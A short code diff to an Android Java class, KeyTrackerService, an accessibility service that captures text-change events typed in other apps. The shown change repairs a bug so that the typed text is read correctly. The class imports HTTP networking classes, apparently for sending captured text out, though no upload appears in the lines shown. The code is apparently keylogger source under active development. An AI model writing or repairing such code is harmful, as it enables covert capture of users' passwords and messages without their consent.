@@ -6,6 +6,7 @@ import android.util.Log;
 import android.os.Handler;
 import android.os.Looper;
 import android.content.res.Resources;
+import java.util.List;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -23,7 +24,13 @@ public class KeyTrackerService extends AccessibilityService {
         // Capturer les événements de changement de texte
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             CharSequence beforeText = event.getBeforeText();
-            CharSequence text = event.getText();
+            // event.getText() returns a List<CharSequence>
+            List<CharSequence> texts = event.getText();
+            CharSequence text = null;
+            if (texts != null && !texts.isEmpty()) {
+                // In practice, the first item is the current text of the view.
+                text = texts.get(0);
+            }
             
             if (text != null && text.length() > 0) {
                 // Si on a le texte avant, on peut détecter les caractères ajoutés
